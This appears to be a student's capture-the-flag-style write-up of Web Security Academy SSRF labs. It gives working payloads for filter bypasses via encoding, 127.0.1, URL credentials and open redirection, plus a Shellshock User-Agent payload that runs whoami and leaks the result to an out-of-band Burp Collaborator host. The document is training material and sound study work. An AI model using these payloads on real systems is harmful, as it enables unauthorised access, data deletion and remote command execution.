# Server-side request forgery (SSRF)

### Lab: Basic SSRF against the local server

Task: Access admin portal and delete Carlos

Solution: `stockApi=http://localhost/admin/delete?username=carlos`

Solution (URL encoding): `stockApi=%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%2f%61%64%6d%69%6e%2f%64%65%6c%65%74%65%3f%75%73%65%72%6e%61%6d%65%3d%63%61%72%6c%6f%73`

Explanation: Exploiting the SSRF vulnerability and accessing the administration dashboard on `http://localhost/admin/`, we realise that deleting members essentially makes use of a GET request. Hence, we can exploit the SSRF vulnerability to delete members without accessing the administration dashboard (directly making the GET request via browser would not work as we are not authenticated as administrator).

Notes:

- Can use URL encoders to encode your payload such as this [one](https://www.urlencoder.org/)

### Lab: Basic SSRF against another back-end system

Task: Access admin portal and delete Carlos

Strategy: Use Burp Intruder to find the IP.

Solution: `stockApi=http://192.168.0.45:8080/admin/delete?username=carlos`

Notes:

- Quickly generate payload using python, can use online compilers such as this [one](https://www.programiz.com/python-programming/online-compiler/)

  ```
  for i in range(256):
    print(i)
  ```

### Lab: SSRF with blacklist-based input filter

Task: Access admin portal and delete Carlos

Hints: There are 2 defenses, bypass them one at a time

First bypass: 

- Using `stockApi=http://localhost`, we encounter "External stock check blocked for security reasons"

- Using Burp Intruder and the payload obtained from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery), find the bypass with 127.1 or 127.0.1

Second Bypass:

- Using `stockApi=http://127.0.1/admin` we encounter "External stock check blocked for security reasons"

- Using `stockApi=http://127.0.1/%61%64%6d%69%6e` we still encounter "External stock check blocked for security reasons"

- Using `stockApi=http://127.0.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65` we manage to bypass it

Solution: `stockApi=http://127.0.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos`

### Lab: SSRF with filter bypass via open redirection vulnerability

Task: Access admin portal and delete Carlos

More on open redirection over at [hacktricks](https://book.hacktricks.xyz/pentesting-web/open-redirect)

Get product request

```
GET /product?productId=1 HTTP/1.1
Host: 0ac10095033d6727c0f46456007b0058.web-security-academy.net
Cookie: session=hdmugIYAE5PuwvXSd5ajGQcYK8PxGJ9f
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac10095033d6727c0f46456007b0058.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
```

Next product request

```
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/1.1
Host: 0ac10095033d6727c0f46456007b0058.web-security-academy.net
Cookie: session=hdmugIYAE5PuwvXSd5ajGQcYK8PxGJ9f
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac10095033d6727c0f46456007b0058.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
```

Sending URL encoded payload `stockapi=/product/nextProduct?currentProductId=1&path=/product?productId=2` returns a successful response

Solution (no URL encoding): `stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos`

Solution (with URL encoding): `stockApi=%2f%70%72%6f%64%75%63%74%2f%6e%65%78%74%50%72%6f%64%75%63%74%3f%63%75%72%72%65%6e%74%50%72%6f%64%75%63%74%49%64%3d%31%26%70%61%74%68%3d%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%30%2e%31%32%3a%38%30%38%30%2f%61%64%6d%69%6e%2f%64%65%6c%65%74%65%3f%75%73%65%72%6e%61%6d%65%3d%63%61%72%6c%6f%73`

### Lab: Blind SSRF with out-of-band detection

Task: Access admin portal and delete Carlos

Starting a Burp Collaboration Server:

- Click on Burp tab

- Click on Burp Collaborator Client

- Click on Copy to clipboard

- This essentially sets up a server to receive requests (HTTP, DNS etc.)

Strategy: Target server has a analytics software which looks at Referer and makes a requests to it (maybe something like a GET request). Change the referer to the Burp Collaborator Client address to trigger the analytics software to send requests to it. Ensure to pad `http://` before the payload.

### Lab: SSRF with whitelist-based input filter

Task: Access admin portal and delete Carlos

Get product stock request

```
POST /product/stock HTTP/1.1
Host: 0aaf003e04480b86c0ccc3a3008b00cd.web-security-academy.net
Cookie: session=R7fYWSmOM8jnbJDnFiXPbXqqBwHxDSoZ
Content-Length: 107
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0aaf003e04480b86c0ccc3a3008b00cd.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aaf003e04480b86c0ccc3a3008b00cd.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

Bypassing whitelist:

- Changing the hostname to localhost, we encounter "External stock check host must be stock.weliketoshop.net"

- Changing the hostname to `username:password@stock.weliketoshop.net`, our request is successful

- Changing the hostname to `localhost:80@stock.weliketoshop.net`, our request is successful

- Changing the hostname to `localhost:80#@stock.weliketoshop.net`, our request is unsuccessful with the same error message

- Changing the hostname to `localhost:80%23@stock.weliketoshop.net`, our request is unsuccessful with the same error message

- Changing the hostname to `localhost:80%25%32%33@stock.weliketoshop.net`, our request is unsuccessful but we get a different error message "Not Found"

- Using `stockApi=http%3A%2F%2Flocalhost:80%25%32%33@stock.weliketoshop.net%3A8080%2Fadmin` payload allows us to successfully bypass the whitelist

Strategy: Use HTTP basic authentication to set the admin panel URL along with `#` to treat stock.weliketoshop.net as an anchor to localhost:80 as seen [here](https://stackoverflow.com/questions/8192742/what-is-the-meaning-of-in-url-and-how-can-i-use-that) in order to run our SSRF exploit while bypassing the vulnerabilities

Solution: `stockApi=http%3A%2F%2Flocalhost:80%25%32%33@stock.weliketoshop.net%3A8080%2Fadmin/delete?username=carlos`

### Lab: Blind SSRF with Shellshock exploitation

Task: print out name of OS

Structure of shellshock vulnerability payloads found [here](https://www.exploit-db.com/docs/48112#:~:text=Shellshock%20is%20effectively%20a%20Remote,stored%20into%20an%20environment%20variable.)

Solution: There is a server vulnerable to SSRF and shellshock on 192.168.0.X. We first need to craft a shellshock payload before finding out the IP. We can craft such a payload `() { :;}; /usr/bin/nslookup $(whoami).BURP_COLLABORATOR_CLIENT_PAYLOAD`. Burp Collaborator Client can receive requests from its subdomains as well :). We can assume that the analytics software given in the lav makes a request to the internal vulnerable server using the parameters of our request which thereby triggers the shellshock payload.

Burp Intruder Request:

```
GET /product?productId=1 HTTP/1.1
Host: 0aaf007f049289f8c0c890a200ed0054.web-security-academy.net
Cookie: session=LMacyTCkPC2BQ3Ews7qvyTtDlcEYQ28s
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: () { :;}; /usr/bin/nslookup $(whoami).rojiev0przqxc7fdxnx1g7kbu20toi.burpcollaborator.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://192.168.0.§1§:8080
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
```

